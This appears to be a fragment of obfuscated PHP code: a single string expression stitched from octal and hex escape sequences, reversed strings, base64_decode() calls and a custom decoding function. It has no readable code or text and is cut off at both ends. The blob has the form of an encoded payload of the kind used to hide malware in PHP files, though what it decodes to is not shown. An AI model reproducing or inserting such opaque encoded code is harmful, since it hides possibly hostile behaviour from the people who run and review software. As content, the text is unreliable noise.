\356\233\335\73\317\71\355\242\112\160\170\343\51\255\257\374\140\217\107\224\115\247\317\175\46\354\274\242\204".strrev('~++x:6u?_k:3Z.MW?p').strrev('2 p}77Vvsowu~')."\xf1\x4d\xf\xf8\x97\x1d\x36\xe5\xbb\x7f\xeb\x7c\x6d\xc1\x63\x4f\x1c\xb8\xb9\x67\xc6\xdf\x8b\xfb\xed\x73\xd3\xfe\x7\x28\xcd\x27\x7c\xbe\x66\xf3\x3b\xc7\xea\xd7\x7d\xa8\xbc\xf0\xee\x7b\x7b\xfd\xf1".base64_decode('hcvmHf7hgmmL7ePjP4hcu9Ob8f0e6synXxn6+IPzVly/4eq5r1wykn7jv9d9NPLvtQ==')."\x7f\x6e\x7b\xf0\x47\xaf\x76\x3f\x11\xde\xb1\xef\xa6\xc7\x97\x9f\xd2\xb7\xd7\x79\xcf\x9e\xfb\x72\xfd\x5e\xb7\xcd\x98\x55\xf7\xc1\x65\xcb\x6e\xb9\x32\x13\x3e\xf2\xb3\xe1\x17\x5e\x3d\x6d\x6a\xdf\x92"."\267\73\36\177\360\214\107\273\236\76\270\356\201\375\116\337\357\307\217\157\332\164\373\206\312\246\335\56\173\274\251\334\377\341\326\256\17\237\136\365\275\31\127\217\377\176\227\55\312"."\xeb\xcd\xd7\xd9\x4f\x6e\xaa\x6c\xb5\x26\x7e\xd7\xb6\x3c\xaa\x66\x6f\x59\x75\xd5\x83\xf7\x1b\x57\x9e\x51\x7f\x66\xe1\xa9\xd2\x9b\xfb\xde\xb2\xf7\x55\x7\x8c\xed\xfc\xca\x49\xdf\xff\xf0\xe1\xd5\xbb".base64_decode('/P3NBeGzfzGy8aMNc68fuW31s08273Ptjw79+H7nq/0utC5ae8BL7x48ZZdz7vr9+w==').strrev(':>opv׵ms?ˏy;]_//{')."\x3e\x7b\x7f\xe3\xc4\x4d\xaf\x1f\xf8\xc3\x7d\x8e\xdb\xfe\xd8\x94\x97\x5f\x7d\xf1\xb\xdf\xe1\x7f\x7f\x7f\x44\x3f\xe6\x81\xd7\x97\x65\x3b\xbe\x93\x38\x69\xd6\xc3\x87\x2f\x59\xb7\x66\x97\x83\xce\x7d"."\x7d\xa7\x1d\x5b\x5e\x79\x44\x3f\xf0\xcf\xdd\x17\xde\xfc\x97\xcf\x3f\xbe\x71\xd7\xb5\x2f\x7c\x5a\xfe\xfe\xcc\xe5\x53\xa7\xbc\xff\x56\xdf\xaf\x76\xfc\xec\xa5\x33\x7e\xf9\x87\x57\x9e\xbb\xe7\xdd\x4b"._kodDe('LtPuS+XvXvnFfsvbL0+8L1a+6o07Ld/A42ef5AzYYqOBXCdM/7butW0PE+rJ08ytT+o=').base64_decode('8KX3LIhmjr360R3dT5506KX/3vbyPy8/Zvyf739ywU2XH/XVP96b+7Ta99uj//Xx1g==')."\17\202\117\37\365\365\7\37\236\160\310\366\313\277\376\350\255\255\327\237\272\370\353\367\177\161\311\335\167\55\135\377\366\147\307\254\75\363\221\313\67\375\353\232\372\271\27\67\67".strrev('~Gjp;w#^{'."\n".'wZ#ܗwu<')."\7\374\273\177\376\245\377\350\157\217\135\222\272\360\275\373\167\235\33\355\135\66\365\244\114\350\261\272\164\347\225\263\316\272\357\235\67\227\34\174\300\171\257\176\377\67\37\257\336".strrev('%r?y^_>}??2Ь?t{Iz_')."\253\347\357\275\360\304\271\217\34\272\353\363\57\215\34\161\350\157\76\270\141\311\207\323\217\130\152\317\327\42\201\372\17\366\37\272\360\157\273\375\155\250\341\327\147\167\237\333\232"."\312\177\265\157\347\262\375\57\330\370\243\163\26\136\237\65\177\73\32\273\343\231\317\232\257\134\175\337\232\235\166\371\355\306\275\373\117\330\164\310\35\211\113\12\47\76\364\336\156".base64_decode('b+x5cenW15LH/Wv90w99qd0+85DnHrn3uSMfuuT5Vz/9c/NFgYNuX5GPxawHkse81A==').base64_decode('NPL4/Hmtrc89XLpjgb9052j8xWU3Nh/1yV1/er501ZIfvnvFkjM+Dm599dNcy8fF5w==')."\277\274\127\65\377\173\277\47\66\256\334\373\365\247\166\74\276\342\351\153\266\4\26\17\376\153\307\303\137\365\335\363\302\176\372\345\311\77\247\317\277\371\344\133\373\265\5\123\356"."\70\243\265\360\317\23\147\307\317\255\234\171\317\346\347\77\177\314\177\176\372\245\310\161\233\147\4\177\174\302\201\373\135\370\373\117\257\373\315\263\227\375\240\171\333\33\373\237\167".strrev('z|WۆßcNzlq\\WaZ9֐D').base64_decode('2NztX17469+8t9sJ/jsndrr62B/ltg2f+OOp5+29+sGbrm4r73TpdW/3tP3go4OH5g==').strrev('^OQy39{}VӇ~Sg~f')."\xbe\xd9\xff\x3a\xf4\x8f\x4f\x1e\x77\xed\x8f\x3f\x7c\xf1\xf2\x47\xcb\xd3\x5e\xf9\x5f\xf3\xfe\xb1\xff\x81\xdf\xef\xcf\x2e\x7a\x3c\x7e\x70\xf8\xcc\x81\x9d\xbe\x3b\xf6\x9d\x27\x77\xaa\xff\xaf\xdb\xe".base64_decode('2XRBx/CrKy769T9P/fI/F13SrPpv+s0Pl+vrWk+5ftqaw6YFlh38wq9OvCd2wnW3vw==')."\xb7\xf9\x85\xff\x3a\x72\xe6\x8a\xb5\xdb\x7e\xbd\xf4\x86\x87\xe3\xf6\x5f\xd7\x5c\x5f\xfe\xd3\xa6\xad\x27\x6b\x2f\x3d\x74\xf2\xc9\xbf\x3c\x61\xf7\x5d\x8f\xd9\xf5\xfb\x97\xde\xf1\xbb\x4b\x2f\x5d\x36"."\x78\xda\xe1\xfa\x6f\x5e\x7c\x65\xe3\x2d\x37\x7d\x6f\x70\xce\xf4\x23\xdf\xfe\xf8\xe2\xca\x1b\xaf\xdc\x7a\xed\xb5\x3b\xdd\xd8\x3c\x72\xea\xa6\x8f\x5e\x3b\xf2\xaa\xfb\x17\x3d\xf0\x97\xcf\x6f\xd9\x9c"."\x5a\xb9\xe6\x47\xbb\x74\x3e\x72\x67\xf6\x69\xe7\x27\xd7\xfc\xf5\xba\x29\x57\xdf\xfb\xd0\x2f\xf6\xe9\xff\xba\xb8\x7c\xe7\x7f\xde\xf5\xbb\xc5\xd3\x4f\xda\x67\xcd\x5\xef\xdc\x5f\xff\x72\xe6\x46\x5d"."\x79\xe3\xbc\xeb\xc3\x77\xfd\xe9\xa0\x1b\xc2\x77\x6d\x7e\xee\x24\xe5\xdc\xdf\xaf\x5c\x78\xd4\x5\xcf\x8f\xbf\x75\xf9\xb4\xd7\x66\xdf\xd1\xf6\xf1\x1d\x37\xa6\xcf\xba\x15\x45\xfe\x38\x6d\xf7\xc7\x3e"."\74\370\263\7\56\112\37\376\301\303\217\374\355\230\313\26\177\371\327\257\76\273\274\377\350\117\77\270\355\173\17\264\174\371\306\47\117\55\372\342\363\267\256\32\334\176\314\27\237"."\xcd\xd\x2e\x9a\xbf\x6e\x47\x24\x7d\x41\xf0\xf2\x45\xf\x7c\xfe\xf4\x8b\xcf\x7e\xf2\xe2\x31\xf7\x8c\xfd\xe3\xaf\x6f\x9d\xf3\xbd\xa7\x8e\xfe\xf2\xe4\xdb\xce\x58\x7c\xff\xe7\xef\xff\xe4\x82\xcb\x8f"."\371\342\337\377\76\372\321\351\167\64\74\363\311\55\373\156\332\375\270\331\331\55\253\227\134\125\67\66\364\366\13\257\134\362\331\216\165\17\157\377\345\363\107\156\271\345\216\327\136"."\x7d\xb9\xf8\xd1\x47\x77\x2d\x78\xed\xb2\x17\x16\xcf\x5b\x78\xef\xbf\xdf\x3c\xac\x29\xb6\xf7\x9f\x4e\xb8\xd2\x5e\xd8\x76\xe3\xc9\xff\x6a\xde\x33\x3f\x36\xe3\xa2\xa7\xe2\x7b\x2f\xff\xe3\x23\xcf\x3d".base64_decode('/v6fJubf9WlWu+7u6WeF/zm4y5XBv/gW7/H2WaXb1jzbf5DaduDvzrrllsGzL3pCew==').base64_decode('ZvnaG3e96tO7Wn+38a/XfJ8ZF81vAhHteG7taKEIV0pgEzGLqTLNb54LDP/Q2tzgAA==')."\xdc\x16\x82\x2e\xcf\xec\x39\x50\xc5\x9c\x79\xa0\xe7\x33\x6b\x26\x94\x1b\xd5\xcb\x86\xa3\x4d\xc0\x61\xc0\x1a\x1c\xd0\x98\x10\x69\xee\x7c\xc8\x32\x63\xe\x14\x1a\x34\x46\x32\x43\xec\xca\x72\xc4\x72"."\x32\xe3\x45\x28\x38\x9a\x1d\x9c\xe0\xaa\x9\x50\x6c\xf6\x4c\xb8\xf6\x9d\xc3\xda\x38\x32\x5e\xc9\x8d\x15\x81\x91\x9e\x31\x1f\xba\x90\xcf\x5a\xb9\xf1\x41\x6\x85\x1f\xa6\x3f\xa7\xe5\x86\xc7\x4d\xf8"."\210\125\36\30\65\113\20\31\236\30\103\47\131\150\352\332\241\221\142\151\34\104\144\43\45\43\353\60\126\274\60\224\311\131\145\70\276\1\113\133\236\50\215\33\143\300\220\317\150"."\x2\x65\xc5\x89\x82\x36\x6c\xf\x2\x74\x1e\xd3\x87\x72\x6\xed\xa1\x42\x19\xee\xc5\x67\x36\x43\xb3\x8c\xb5\x23\x76\x25\x7\xbc\xfb\xbc\x59\xf3\xa1\x9f\x73\xe0\x3\x79\x74\x9e\xce\xc\x43\xdb\xcc"."\221\241\274\241\101\163\346\100\326\371\363\130\107\147\263\101\232\5\303\61\167\16\4\346\314\205\314\343\116\45\147\145\240\15\146\256\122\32\57\302\131\54\67\212\72\122\50\262\317".base64_decode('w2zPnMUmbmYTa69mFhwQdQ6XJpyczYQD1uBQfgSwZbxYKU/kYAjmzAaEmjuXYxFrKw==').strrev('IeΆs'."\r".'CUBf'."\n".'_1\\b(̹\\_c76').strrev('lG"tсY2'."\n".';8sTd|v!spFɟQPk')."\xc4\xc0\xa8\x9e\x67\xd6\x43\x33\xe6\xc1\x38\x68\x63\x13\x56\x65\xc8\x60\xf3\x6\xd5\xd9\x95\x21\xb4\x7c\xd6\x42\x41\x7d\x7c\xd0\xc8\x31\x8d\xe8\xa1\xb5\xa5\x32\x53\x93\x69\x9e\xf\xb5\xcc\x6e\x86"."\x82\x73\x67\xc3\x3c\x5b\xe3\xa5\x89\x42\x6\x6\x45\x1f\xca\x17\x86\x99\x8d\x45\x21\x3f\x51\xd6\x33\xd0\xba\xb2\x69\xf\x4c\xe4\x35\x36\x5c\x50\x78\x6c\x78\xd0\x1c\x2f\x5a\x6c\xa1\x1\xd6\xe6\x33"."\303\105\153\200\341\347\14\206\226\343\103\271\322\132\246\5\62\134\36\250\24\62\154\376\146\63\52\2\365\317\203\200\123\312\30\303\243\25\326\166\276\264\347\63\322\300\154\263\354"."\xe1\x72\xd1\x1\x49\xbc\x3d\x58\xb1\x26\x98\xaa\xd8\x9c\x59\x4d\x8c\x8e\xb1\x8f\xcc\x9a\xc7\x46\xdf\x2e\x8e\x31\x8d\xc9\xa2\x36\x30\x96\xcb\x33\x83\x9a\xb1\xdc\x70\x71\x64\x88\xe5\x87\xb1\x1b\x1e"."\xb4\x35\xcb\x1c\x61\x4b\x14\x90\x76\x74\x68\xb8\x9c\x85\x2f\x17\xd7\x1a\x63\xa5\x3c\x7c\xd9\x5a\x5b\x76\xa\xc3\xcc\xf4\x66\x18\x7d\x6a\x10\xd6\xcd\xcc\x19\xf3\x58\xfe\xca\x44\xd6\x19\xe3\xc3\x3d"."\146\147\162\154\205\302\107\271\36\151\233\226\35\142\102\136\131\31\223\233\231\225\2\105\255\304\165\140\72\1\123\262\262\335\201\234\141\110\327\231\362\66\114\203\43\224\54\100\371".base64_decode('E+BGURdCanotwEqKEziWhUhqGjiakmvJlhwpGcVcqSnHtLhiCFU5C+AWBuSuri4yUg==')."\x5e\xe3\x7e\x11\x4\xb3\xb6\x3d\x6a\x5a\x30\x64\x43\x66\x2e\x5b\x30\x2b\x39\x57\xad\xb9\x8c\xab\x4e\xe\x65\x22\x3\x6f\xca\xc0\x24\x70\x54\x8f\x4b\x7d\x9a\xc1\x5c\x83\x95\x21\x93\xa6\xca\x91\x0".base64_decode('G+6MNKFUcu5o9lBABvvlVKOEWlEoBNxWsir5A2NALTFtrGxcErfR9pA08Ni8tadbTQ==')."\x87\x52\xcb\x25\xbd\x3c\x6c\x7e\xc9\xd0\x49\x15\xaa\xf2\x52\xb7\x44\xd\xd2\x38\xca\x33\xe8\x1e\x2\x86\x21\xef\xde\x74\xdf\xd6\x33\xce\xdf\x76\xde\xcd\xdb\x36\xde\xb8\xf5\xde\x73\xde\xbd\xf1\xe6"."\255\133\316\103\321\167\356\76\175\353\215\227\275\167\321\111\357\334\275\361\235\273\217\175\367\344\333\77\271\377\264\255\147\334\364\356\11\133\266\136\262\171\353\325\47\277\163\337\226"."\167\37\70\171\373\346\123\337\271\373\206\155\227\234\262\365\244\73\337\271\357\374\255\77\277\142\353\311\147\154\73\147\343\73\133\56\101\371\267\375\134\324\214\262\155\275\341\102\134"."\xf6\xfe\xe3\xb7\xde\x7d\xf7\xbb\x57\x6e\xe6\xa9\x9f\xdc\x7f\x1c\xd0\x47\x58\x7f\x4b\x75\x7\x5b\xad\x32\x65\x2b\x32\x3a\xca\x22\x5\x10\x52\xb7\x3\x4a\x77\x41\x47\x23\xac\x64\xf3\x7a\x76\x8\x6b"."\146\71\171\335\122\34\242\241\245\241\277\45\263\344\247\10\107\55\202\155\305\50\341\144\205\315\115\200\43\145\132\57\226\61\152\301\50\5\251\325\240\113\47\137\302\277\132\303\114".base64_decode('E2qgFR5rMVcNOAh3bVi8pwxoCJBrUQZQMYVZ9iiOycLFcT7pnkVQc1p5M9jUDnIpuw==')._kodDe('Mev9sC9QEWf4P24/ckJRNqZYb6aqdnbRifYLu32y/4ztiC9Az2K1z51+IwSy2epJ30s=')."\143\162\363\55\275\134\340\127\101\130\300\131\163\20\345\326\310\167\321\236\256\245\152\14\43\357\234\53\21\255\353\212\123\43\243\74\332\262\64\330\60\333\13\210\320\211\53\113\162"."\x55\x2f\xba\x41\xa3\x42\xa\x8d\x3e\xc4\xe9\xa4\xa5\xe7\xc\xa6\x51\xac\x17\x49\x4e\xa0\x8f\x1\xe9\xe\x88\xda\xd5\x70\xb5\xe6\x2c\x5a\xe\x96\xeb\x3a\x6b\xe1\xe2\x72\xbe\x8c\x9d\xd\x38\xb\x16".base64_decode('g1Ezs46S2gBhYSckQwveKzK+eMJtksk/ztbi9/slaa7QJ8MhqE5cECNYBK/syeBhrg==')."\x44\x81\x96\xfc\xe0\xa0\x6e\x3b\x2d\xc4\xce\x50\x99\xae\xa0\x86\xce\xb\x34\xa3\x0\x59\x1c\xb3\x3\x73\x51\x90\x8c\x18\x2c\xe8\x3e\x18\xc5\x8a\xcd\x8c\x5f\xa6\x6\x66\x81\xe5\x99\xbd\x0\x34\x40".strrev(''."\0".'9]6@j'."\0".'R:@*NRwYDP`TT5*Һ').strrev('e<ᓋd@&CEZ97.X'."\n".'4J')."\xb8\x1a\xaa\x5d\xd0\xd8\xd5\xa3\x8d\xad\x3a\x4a\x3a\xc7\xbf\x8a\x2d\x74\xf1\xb5\x1\x30\x4b\x8d\x96\xbc\x10\x1a\xc7\x4a\xdd\x2a\xda\xf9\x6d\x69\xf9\xab\x83\xba\xa3\x2\x33\x64\xb3\xad\x30\x15\x6d"."\127\273\103\314\122\103\53\227\203\166\156\310\16\142\75\112\143\104\217\31\231\40\266\3\307\170\31\340\226\322\144\117\120\265\214\151\71\154\324\320\152\121\163\6\64\57\26\155\123"."\303\321\44\137\331\16\263\7\16\165\107\325\124\52\41\175\220\30\227\256\122\227\47\302\152\173\42\261\74\12\30\17\163\334\42\21\150\154\227\47\156\261\161\114\330\347\341\53\41"."\x59\x87\x4d\xe6\x80\xb0\x8b\x4\xbc\xcb\xa7\x14\xd0\xf5\x44\x4b\xab\xbd\x33\x94\xe4\x1a\xf6\xb3\x3\x4d\x81\x66\x91\x17\x7d\x50\xc5\x86\x6\xad\xcc\x1c\x3b\x95\xe\x25\x6b\x38\xca\xa0\xe\x34\x60"."\376\301\151\6\24\350\114\254\124\332\23\261\236\256\170\212\372\207\240\360\170\102\112\47\172\324\220\314\334\150\124\47\103\365\221\356\130\250\75\242\104\343\351\4\63\224\340\252\254"."\xc4\x44\x26\xc5\xe3\x6c\x8\x2c\x5b\xe7\x6e\x32\xa0\x3c\x8d\xc8\x66\x3c\x72\x8d\xbc\x26\x58\x31\xbd\xbe\xfa\xbe\xba\xbe\x69\x7d\xd\x7d\x8d\x6b\x2\x7d\x76\x7f\x50\xda\x32\xd\x79\x7a\x20\xd2\x1d".base64_decode('hu618FDOBoTpSqWOALO+RDLUHmNNQegHwUR7lAa2n3vLO/eevv2XN249ZSOqaNvFxw==')."\157\273\340\116\304\41\141\256\350\306\323\266\377\366\364\155\347\336\264\355\64\340\146\224\167\157\272\353\235\55\17\154\77\167\363\326\33\57\334\166\376\75\333\57\76\221\46\274\167"."\xdd\x2d\x5b\x7f\xb1\x99\x37\x4c\x79\xef\x9c\xdf\x6e\x3b\x7d\x13\xe7\x94\x28\x83\xe4\x43\xa5\xdf\x3b\x69\xe3\xf6\x2d\x37\x62\x3e\xe9\xaa\x63\xb7\xdd\x71\xea\xb6\x4b\x36\x6e\xfd\xc5\x95\x5b\x2f\xda"."\xbc\xfd\xf4\x9b\xb6\xfe\xea\x84\xad\x3f\xdb\xf8\xee\x4d\xe7\x1d\xe6\x45\x24\x1a\xef\x65\x53\x1\x36\xc2\xc1\xa3\xb0\x49\x34\x1d\xde\x3e\x7b\x3a\x1e\xda\x46\xf4\xdb\x80\xed\x2e\xd0\x2f\x53\x1f\x27".base64_decode('KsVH9ETi7RGvHZMcBR8j0yiGUI0aYGpt8FHC4sRVQWv9pK1YD/MvNUpqTDiSak9G2w==')."\x22\xa0\xd9\xcf\x27\x6a\x2a\x61\xeb\x40\xd1\x2\x41\x53\xc9\x15\x3c\xcc\x2d\x33\xab\x7c\xc2\x28\xd\xc\x99\x1b\x15\x57\x47\xb4\x40\xd6\x2c\x54\x8a\x25\xd2\x58\xa5\xe\xab\x7a\xd5\xf9\x30\x59\x21"."\x46\x55\x4a\x1d\xde\xba\x11\x40\xcf\xa2\xa5\xd7\x80\x1d\x49\x10\xcd\xe0\xfa\xd5\xf5\xbe\x26\x5f\x73\xa3\x2\xe\x63\x68\x9\x70\x13\xa3\xd4\x81\x82\x39\x2f\xe7\xfa\x88\x2f\xe3\x8a\x35\xfb\x9a\x1a"."\225\272\362\120\35\264\113\214\53\152\275\112\163\332\212\346\153\200\6\313\315\25\171\21\371\264\35\113\63\20\5\125\262\76\16\342\345\321\257\313\365\113\66\40\112\320\171\102\71"."\xbc\x30\x25\x14\xf\xbb\x73\x52\x8f\x31\xdd\xf5\x44\x31\x33\x1b\x70\xb8\x47\xa\x36\xcd\xf5\x8d\x4a\x6\xec\x25\x6a\x24\x92\x62\xae\xc1\x68\x75\xd\x46\xc3\x74\xa0\x13\xdd\x4b\xf9\x7c\x53\x63\x8".base64_decode('hdrK0WZpNpsogJKpwlA6WyyvibqBJofmRwGegs0GeE2IHPEENoMYziexRhpx5VNHWQ==').base64_decode('T9rPoj3ISB2YfHet5n1guKwwvoc7AsJWf5F0eyfF8pSE5rnMVBeiiuFUXCjCzy+Qjw==')."\56\27\114\20\366\44\371\242\361\216\104\262\213\132\273\245\332\73\43\135\241\0\20\161\212\11\64\77\146\352\224\126\245\36\123\76\12\252\167\15\77\371\20\33\262\64\371\52\132"."\x57\xaa\x83\x38\x34\x3a\xa\xe5\x41\x68\xc\xcc\xbe\x42\x6c\xd7\x35\x52\xa4\xb5\x9e\x3a\xdf\x80\x2a\xb9\xc7\xaa\x44\x32\xad\xa2\x1\x0\xf2\x2c\x51\xdd\x7a\x69\xb7\x90\xb4\xc8\xb1\xd1\xd6\x8\x3b"."\x78\xc\x20\x96\xcb\x64\xf2\xb0\x5c\x86\x39\xb6\x42\x95\xe3\x3a\xdb\x13\xf1\x8e\x28\x33\xec\xb\xc3\xb1\xbe\xcc\x24\x98\x90\x29\x9c\x8c\x62\xd7\xd\xf0\x7d\x85\x55\x25\x99\x53\xa2\x88\x50\xeb\x40".base64_decode('kfJojoeFQT5O4Hs+iogtH0X4ZoNzSR648PdTcR4WXDWK9KSYQQemvivDPNzJza9xQg==')."\42\51\105\102\311\120\127\212\107\223\53\271\201\10\207\121\103\21\65\336\323\45\50\176\54\264\2\41\113\102\60\50\214\132\67\4\246\55\156\354\243\266\167\64\110\177\226\260\30"."\266\107\352\137\327\354\123\346\154\150\204\74\334\13\203\223\67\112\214\255\305\137\71\42\246\306\22\113\151\234\170\6\213\224\162\342\20\244\364\52\210\307\116\13\36\333\146\133\27"."\x5f\xd\xa\xc2\x61\x85\x1a\xf4\x2a\xf1\xc4\xca\x90\x70\x36\x25\x25\x0\x44\xf8\x9e\xa\x1e\xd5\xdb\x37\xda\x17\x40\xcc\x82\xbd\x46\xd8\xd2\x85\xdb\x14\xc6\x86\xb4\x13\x21\x2\x95\x35\x40\xe9\x10".base64_decode('20bX+GDHUAvmIGcU42HGLtDfVSxAaCUUQCfrcoEZ1VFrPrVvfd/hff4ANWDEzEufTw==')."\x34\x49\x8d\xac\x42\x7b\x6c\x2a\xe5\xb2\xbe\x54\x89\x3f\x25\xa8\x1d\xf5\x12\x42\x74\xd5\xd2\xc8\x42\xf8\x81\x63\xde\x42\x60\x4f\x21\xba\xa8\x95\x4f\x66\xe4\x88\xf5\x71\xf4\x77\x69\x7a\x7d\x4\xfd"."\x8d\xa1\x9f\x58\x1a\x4d\x97\xc1\x33\xa0\x25\x19\x8b\x2e\x8f\xac\xc7\xff\x88\x84\x46\x3e\x90\xd4\x4e\xc9\x5d\x20\x1a\x5f\x8f\xfe\x45\x4\x66\x7d\x34\xee\xad\xac\x2d\x92\x5e\x19\x89\xd0\xc\x2c\xc"."\277\42\53\42\70\320\125\311\163\34\66\32\200\144\141\104\0\125\253\152\3\31\114\177\377\364\106\125\15\332\75\200\57\334\123\105\103\375\224\346\172\330\103\102\251\166\101\175\135"."\10\121\215\13\104\305\337\215\10\334\37\32\304\227\46\23\75\335\122\274\63\264\42\32\137\312\142\301\151\54\64\15\252\126\302\321\24\32\242\166\206\214\302\115\233\34\7\206\223"."\260\105\62\327\353\102\351\60\242\354\50\42\261\354\370\60\100\51\263\173\225\265\365\104\143\141\331\340\34\147\204\15\205\120\165\330\123\246\262\306\261\70\61\75\147\21\74\344\54"."\114\320\215\105\310\30\260\10\35\0\26\43\303\305\42\304\35\34\213\220\216\262\10\76\235\104\342\54\15\35\107\321\121\222\235\61\363\332\10\267\230\134\220\313\110\156\54\60\15".strrev('NI:Ԙ&,~q)n"'."\n".'&D$zfvP')."\301\365\25\260\42\104\137\211\22\323\115\351\73\314\314\202\210\36\125\123\22\177\223\215\132\6\10\141\27\225\225\203\134\131\310\214\260\352\43\221\70\323\250\373\10\305\351\322\32"."\x7e\x32\x2\xd7\x1a\x3e\xf8\x85\x16\xfd\x7\xfd\xe9\x83\x28\x93\x8f\x80\xe9\x4c\xbd\xf\x36\x59\x66\x6e\xe1\x3e\x80\xf7\xf5\xd5\x4d\x36\x5a\x90\x81\x8d\x19\x44\xeb\x68\x94\x95\x32\xf8\x9e\x97\xcd"."\143\167\50\252\123\144\262\166\162\70\23\122\155\52\31\27\361\160\62\321\115\71\20\45\332\241\120\37\14\112\75\225\245\327\3\153\325\236\214\340\325\101\163\261\264\206\172\227\344".strrev(';rz2*o;-mjTUkAXPcr7J8xRQk')."\5\312\125\261\146\304\233\2\63\176\365\301\241\234\247\120\216\230\46\105\123\150\303\216\305\110\117\121\222\141\143\106\326\247\160\247\7\30\210\17\37\124\272\12\25\261\4\132\21"."\115\212\254\112\47\103\30\110\270\317\275\366\104\177\10\101\301\247\43\253\250\121\213\120\302\263\5\326\200\220\140\215\213\105\244\314\43\146\22\1\203\310\226\47\365\211\247\20\111"."\1\35\146\131\216\260\34\270\156\32\353\116\106\273\102\311\325\60\144\342\14\0\53\320\54\270\354\202\105\304\260\173\44\313\364\70\152\265\154\251\116\347\230\123\130\164\236\145\24"."\26\265\6\26\0\236\171\140\170\250\367\116\225\33\36\63\41\112\3\63\340\365\261\0\163\0\101\214\242\230\120\254\210\110\16\217\211\131\3\334\207\131\221\123\145\263\56\341\136"."\x14\x6f\x92\x78\x92\x19\xb5\xef\x8\xf5\xc4\x64\x8\xc\x95\xb2\x3c\xb2\xfa\x1b\xd6\x8\x6b\x69\xad\x35\xc2\xd2\x98\x38\x86\xaf\x36\xe8\x4f\xc3\x6c\xe8\x1f\xf5\x49\xd1\x30\x3\x9d\x49\x2b\x25\xec"."\x74\x85\x3b\x37\x84\x56\xc1\xde\xda\x93\x4e\xa8\x68\xff\x48\x46\x30\x35\x87\x1e\xf1\x61\x95\xda\x2b\x9d\xbb\xe5\x49\x81\x6a\x70\x6\xee\xab\xf5\x1b\xba\xc6\xf2\xd4\xea\x1a\x2f\xcf\x25\x4f\x91\xf8"."\xd2\x68\x3c\xd2\xda\x35\x1e\x4d\x85\xba\x14\xd6\x70\x90\xad\x61\x97\x86\xf3\xa0\x9e\x68\x42\x8d\x21\x9e\x58\x95\xc5\x67\xd1\x4\xc8\x93\x5d\xe\xf2\x54\x55\xf8\x35\x9\x68\x42\x1d\xdc\xb1\x2a\x92"."\xef\x34\xc3\x24\xaa\xd7\x5d\xdc\x4a\x83\xe8\x8a\x23\x84\x8\x9\x7f\x6\x5c\xe6\x4d\xd2\x2a\x19\x5c\x5a\xde\xae\xa0\xbc\xc7\x2d\xa5\x61\xb6\xe0\x14\x9c\x99\x72\x29\xb\x44\x76\xd5\xf5\x71\xaf\x7a"."\265\14\26\152\340\342\312\230\135\121\163\227\153\120\240\107\362\107\200\13\53\354\203\344\322\250\344\156\36\332\57\13\314\221\222\252\213\336\24\165\333\346\127\307\344\360\303\202\116"."\x5e\xb8\x63\x90\xbd\x82\x86\xdb\xd8\xc8\x55\x4a\x4e\x4a\x2f\x80\x0\x3f\x9c\x21\x4a\xf4\xc2\xc2\x4d\x58\x11\x49\xca\xf5\xe4\x1e\x46\x4c\x7\x75\xd0\xe6\x29\x8\x35\x45\x79\x7f\xa5\x5c\x2\x18\x13"."\156\100\361\265\207\250\263\237\35\341\105\47\251\210\33\366\172\354\266\22\276\64\141\260\35\317\173\261\310\33\137\62\273\165\253\150\220\73\240\225\342\212\207\247\353\62\142\324\32"."\x78\x7f\xb3\xf4\x5\xc9\x7c\x11\x47\x61\x82\xf1\x25\xa7\x64\x21\x52\x29\xa1\x76\xf9\x65\x9b\x23\x34\xe1\x4\x28\x59\x39\x30\x6f\x75\x34\x36\x17\x14\xab\x10\x52\x41\x60\x10\x20\xec\xd7\x62\x29\x1".base64_decode('4YaG1Il5Gr9wC5HTZJNOySn2YTImkCkVCDlgyD4iAsJTKsfxJXzAsakz3Mxj/nhAlQ==').base64_decode('2tLN82e5S2w6GtIwEwANklWptIhGdKKWmta4hBsStIt5TgI/rTFzkBMUxDaCzywXUQ==')."\x89\x26\xa0\x6c\x40\xc7\x36\x4f\xd4\x2\x5\x5b\xa8\xf1\x82\xd4\x9\xda\xb7\x17\xea\x91\x5c\xd5\x4e\x42\x7\x6a\x96\x6b\x87\x8c\xfc\x83\x16\x91\xf1\x7c\xfb\x7\x93\xba\xd8\xaa\x51\x31\x62\x62\xf6"."\xad\x85\x4\x5d\x24\x5f\x22\x85\x24\x5a\xea\x29\x43\xd0\x91\x9a\xc3\xc0\xcc\xe7\x21\x59\xe0\x18\x22\xe0\xf1\x84\xda\x89\xf6\x88\x4\xe3\x24\xc\x3b\xed\xa2\xc9\xac\x14\x90\x8\x72\xe9\x13\x24\x36"."\xba\x70\x4e\x5b\x40\x6e\x8d\xe8\x1d\x26\x4c\xf6\x3a\x44\x6e\x79\x88\x69\x70\x80\x23\x2e\xb1\x83\x87\xe8\xcf\xea\x62\xce\x8f\x1a\xe\x58\x97\xd3\x1d\xee\x0\x9\x53\x39\x66\xcf\x88\xdb\x2c\x99\x38".base64_decode('FzlVHJU8a2ojOrYoY1KQKkUa6Ep156CJ+LYqlehJsisVHMeiJDUZaV/Nbzc4tCO0wg==').base64_decode('C4liUWBoaU0wF1BhODkJqskEluRFYh2eAqlO7gnVDVNj0fjymgmIn+iSilBgNB3p8g==').base64_decode('wtw1pCKhJPOyi+NtsUS7lBxNVI8EZ1g4kMoBKTB4VEPfOnKUaUEnmtx6LDDwq/3TGw==').base64_decode('F/dtaGzoCy4OTONyLkquJKvZScA221xavAC8LzEgLQaxYCAAH+GBYF+QedkKikT4FQ==')."\371\371\346\1\336\255\123\324\127\221\253\205\36\227\36\314\164\76\340\265\367\122\231\135\27\43\251\332\0\123\21\210\322\333\122\65\265\72\305\47\311\15\163\241\42\105\146\131\123"."\302\223\31\375\355\226\263\142\345\234\232\31\135\270\354\62\123\226\101\1\303\24\313\104\254\347\234\231\255\140\357\110\142\162\204\121\63\2\5\134\125\40\112\76\44\16\345\260\34"."\123\154\331\226\320\46\11\273\160\73\342\61\227\166\106\227\55\217\165\305\23\335\107\44\123\351\236\25\53\127\255\6\27\221\55\14\133\6\24\77\163\156\6\376\117\203\43\232\25"."\34\141\236\315\127\340\43\202\156\7\145\326\213\3\121\37\261\153\131\346\260\214\112\16\170\52\46\33\301\332\111\264\266\140\261\344\64\117\222\243\333\322\63\246\351\114\222\272\242"."\353\233\53\206\304\336\76\273\237\243\147\116\37\201\240\320\206\263\305\301\10\270\13\277\354\141\35\143\253\314\10\346\62\36\66\0\0\202\277\222\230\5\1\344\316\205\151\164\234".strrev('lGmbT{yJ6aʋI<d^sb]')."\36\223\227\2\331\50\270\102\17\336\216\72\75\13\221\3\205\365\45\121\173\154\121\146\201\43\362\16\304\60\347\224\136\312\3\203\370\34\363\127\304\227\66\215\372\24\341\266\230"."\x9\x3e\